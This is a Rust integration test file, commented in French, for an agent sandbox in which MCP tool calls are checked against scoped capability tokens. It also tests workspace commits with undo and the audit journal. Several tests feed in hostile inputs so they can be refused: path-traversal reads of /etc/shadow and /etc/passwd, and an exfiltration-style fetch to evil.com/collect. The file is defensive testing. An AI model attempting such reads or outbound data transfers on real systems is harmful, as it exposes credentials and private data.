//! Chaîne complète : un agent appelle un outil MCP, la capacité est vérifiée, l'écriture atterrit
//! dans l'espace de travail de la tâche, et tout laisse une trace.
//!
//! C'est la démonstration que les couches tiennent ensemble, pas seulement séparément.

use std::sync::{Arc, Mutex};

use capd::Broker;
use mcp_system::registry::{MemoryJournal, Registry, ToolContext};
use mcp_system::{StdioServer, tools};
use prophet_types::cap::{Act, Grant, Res};
use prophet_types::ledger::EventKind;
use prophet_types::manifest::Manifest;
use serde_json::json;
use time::OffsetDateTime;

const MANIFESTE: &str = r#"
[agent]
id = "org.exemple.analyste"
version = "1.0.0"
name = "Analyste"
publisher_key = "ed25519:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="

[model]
preferred = ["local:qwen3-8b"]

[capabilities.max]
"fs.read" = ["~/ventes/**"]
"fs.write" = ["~/ventes/out/**"]
"fs.list" = ["~/ventes/**"]
"tool.call" = ["fs.*", "task.*", "clock.*"]
"#;

fn now() -> OffsetDateTime {
    OffsetDateTime::from_unix_timestamp(1_789_000_000).unwrap()
}

struct Monde {
    _dir: tempfile::TempDir,
    home: std::path::PathBuf,
    registry: Arc<Registry>,
    journal: Arc<MemoryJournal>,
    context: ToolContext,
}

fn monde() -> Monde {
    let dir = tempfile::tempdir().unwrap();
    let home = dir.path().to_path_buf();
    std::fs::create_dir_all(home.join("ventes")).unwrap();
    std::fs::write(
        home.join("ventes/q3.csv"),
        "produit,montant\nA,100\nB,250\n",
    )
    .unwrap();
    std::fs::create_dir_all(home.join("prive")).unwrap();
    std::fs::write(home.join("prive/journal-intime.txt"), "confidentiel").unwrap();

    let espace = sfs::Workspace::begin(&home, "task:01", &["~/ventes"], now()).unwrap();
    let workdir = espace.workdir();

    let mut broker = Broker::new(
        ed25519_dalek::SigningKey::generate(&mut rand::rngs::OsRng),
        "capd@test",
        home.display().to_string(),
    )
    .unwrap();
    let manifest = Manifest::from_toml(MANIFESTE).unwrap();
    let token = broker
        .mint(
            &manifest,
            "task:01",
            "u",
            &[
                Grant::new(Res::Fs, Act::Read, "~/ventes/**"),
                Grant::new(Res::Fs, Act::Write, "~/ventes/out/**"),
                Grant::new(Res::Fs, Act::List, "~/ventes/**"),
                Grant::new(Res::Tool, Act::Call, "fs.*"),
                Grant::new(Res::Tool, Act::Call, "task.*"),
                Grant::new(Res::Tool, Act::Call, "clock.*"),
            ],
            1800,
            now(),
        )
        .unwrap();

    let journal = Arc::new(MemoryJournal::new());
    let mut registry = Registry::new(Arc::new(Mutex::new(broker)), journal.clone());
    tools::register_all(&mut registry);

    let context = ToolContext {
        token,
        task: "task:01".into(),
        home: home.display().to_string(),
        workdir: workdir.display().to_string(),
        sandbox_level: 1,
        step: 1,
    };
    Monde {
        _dir: dir,
        home,
        registry: Arc::new(registry),
        journal,
        context,
    }
}

#[test]
fn lecture_dans_le_perimetre() {
    let m = monde();
    let result = m.registry.call(
        "fs.read",
        &json!({"path": "~/ventes/q3.csv"}),
        &m.context,
        now(),
    );
    assert!(!result.is_error, "{result:?}");
    let structured = result.structured.unwrap();
    assert!(structured["content"].as_str().unwrap().contains("A,100"));
    assert_eq!(structured["truncated"], json!(false));
}

#[test]
fn lecture_hors_perimetre_refusee() {
    let m = monde();
    let result = m.registry.call(
        "fs.read",
        &json!({"path": "~/prive/journal-intime.txt"}),
        &m.context,
        now(),
    );
    assert!(result.is_error);
    assert_eq!(
        result.structured.unwrap()["code"],
        json!("PolicyDenied"),
        "le jeton couvre fs.read mais pas ce chemin"
    );
    let rendu = format!("{:?}", m.journal.events());
    assert!(
        !rendu.contains("confidentiel"),
        "aucune fuite dans le journal"
    );
}

#[test]
fn traversee_de_repertoire_refusee() {
    let m = monde();
    for chemin in [
        "~/ventes/../prive/journal-intime.txt",
        "/etc/shadow",
        "~/../etc/passwd",
    ] {
        let result = m
            .registry
            .call("fs.read", &json!({"path": chemin}), &m.context, now());
        assert!(result.is_error, "{chemin} aurait dû être refusé");
    }
}

#[test]
fn ecriture_reste_dans_l_espace_de_travail() {
    let m = monde();
    let result = m.registry.call(
        "fs.write",
        &json!({"path": "~/ventes/out/rapport.md", "content": "# Rapport Q3\n"}),
        &m.context,
        now(),
    );
    assert!(!result.is_error, "{result:?}");

    // Rien n'a atteint l'espace de l'utilisateur.
    assert!(
        !m.home.join("ventes/out/rapport.md").exists(),
        "une écriture ne doit jamais atteindre le disque avant validation"
    );
    // Mais la tâche voit bien son propre travail.
    let relu = m.registry.call(
        "fs.read",
        &json!({"path": "~/ventes/out/rapport.md"}),
        &m.context,
        now(),
    );
    assert!(!relu.is_error);
    assert!(
        relu.structured.unwrap()["content"]
            .as_str()
            .unwrap()
            .contains("Rapport Q3")
    );
}

#[test]
fn ecriture_hors_zone_autorisee_refusee() {
    let m = monde();
    let result = m.registry.call(
        "fs.write",
        &json!({"path": "~/ventes/q3.csv", "content": "saccage"}),
        &m.context,
        now(),
    );
    assert!(
        result.is_error,
        "le jeton n'autorise l'écriture que dans ~/ventes/out"
    );
    assert_eq!(
        std::fs::read_to_string(m.home.join("ventes/q3.csv")).unwrap(),
        "produit,montant\nA,100\nB,250\n"
    );
}

#[test]
fn puis_la_tache_est_validee_et_annulable() {
    let m = monde();
    m.registry.call(
        "fs.write",
        &json!({"path": "~/ventes/out/rapport.md", "content": "# Rapport Q3\n"}),
        &m.context,
        now(),
    );

    let mut espace = sfs::Workspace::open(&m.home, "task:01").unwrap();
    let diff = espace.commit(now(), None).unwrap();
    assert_eq!(diff.counts(), (1, 0, 0));
    assert!(m.home.join("ventes/out/rapport.md").exists());

    espace.undo().unwrap();
    assert!(
        !m.home.join("ventes/out/rapport.md").exists(),
        "l'annulation doit effacer ce que la tâche avait produit"
    );
}

#[test]
fn la_recherche_respecte_le_perimetre() {
    let m = monde();
    let result = m.registry.call(
        "fs.search",
        &json!({"root": "~/ventes", "content_contains": "montant"}),
        &m.context,
        now(),
    );
    assert!(!result.is_error, "{result:?}");
    let trouvés = result.structured.unwrap()["results"]
        .as_array()
        .unwrap()
        .len();
    assert_eq!(trouvés, 1);

    let hors = m.registry.call(
        "fs.search",
        &json!({"root": "~/prive", "content_contains": "confidentiel"}),
        &m.context,
        now(),
    );
    assert!(
        hors.is_error,
        "la recherche hors périmètre doit être refusée"
    );
}

#[test]
fn l_agent_peut_connaitre_ses_propres_droits() {
    let m = monde();
    let result = m
        .registry
        .call("task.status", &json!({}), &m.context, now());
    assert!(!result.is_error);
    let structured = result.structured.unwrap();
    assert_eq!(structured["task"], json!("task:01"));
    assert_eq!(structured["sandbox_level"], json!(1));
    assert_eq!(structured["grants"].as_array().unwrap().len(), 6);
}

#[test]
fn chaque_appel_laisse_deux_traces() {
    let m = monde();
    m.registry.call("clock.now", &json!({}), &m.context, now());
    let kinds = m.journal.kinds();
    assert_eq!(kinds, vec![EventKind::ToolCall, EventKind::ToolResult]);
}

#[test]
fn le_protocole_mcp_repond_correctement() {
    let m = monde();
    let server = StdioServer::new("prophet-system", Arc::clone(&m.registry), m.context.clone());

    let init = server
        .handle(
            r#"{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}"#,
            now(),
        )
        .unwrap();
    assert_eq!(
        init["result"]["serverInfo"]["name"],
        json!("prophet-system")
    );

    let liste = server
        .handle(r#"{"jsonrpc":"2.0","id":2,"method":"tools/list"}"#, now())
        .unwrap();
    let outils = liste["result"]["tools"].as_array().unwrap();
    assert!(!outils.is_empty());
    assert!(
        outils.iter().all(|t| t["_meta"]["requires"].is_string()),
        "chaque outil doit déclarer la capacité qu'il exige"
    );

    let appel = server
        .handle(
            r#"{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"fs.read","arguments":{"path":"~/ventes/q3.csv"}}}"#,
            now(),
        )
        .unwrap();
    assert_eq!(appel["result"]["isError"], json!(false));

    // Une notification n'appelle pas de réponse.
    assert!(
        server
            .handle(
                r#"{"jsonrpc":"2.0","method":"notifications/initialized"}"#,
                now()
            )
            .is_none()
    );

    let inconnu = server
        .handle(r#"{"jsonrpc":"2.0","id":4,"method":"inexistante"}"#, now())
        .unwrap();
    assert_eq!(inconnu["error"]["code"], json!(-32601));
}

#[test]
fn un_modele_ne_voit_que_les_outils_qu_il_peut_appeler() {
    let m = monde();
    let visibles = m.registry.visible_for(&m.context.token);
    let noms: Vec<&str> = visibles.iter().map(|s| s.name.as_str()).collect();
    assert!(noms.contains(&"fs.read"));
    assert!(noms.contains(&"task.status"));
    assert!(
        !noms.contains(&"http.fetch"),
        "le jeton ne couvre pas http.fetch : l'outil ne doit pas apparaître"
    );
}

#[test]
fn la_sortie_reseau_sans_grant_est_refusee() {
    let m = monde();
    let result = m.registry.call(
        "http.fetch",
        &json!({"url": "https://evil.com/collect"}),
        &m.context,
        now(),
    );
    assert!(result.is_error);
    assert_eq!(result.structured.unwrap()["code"], json!("PolicyDenied"));
}
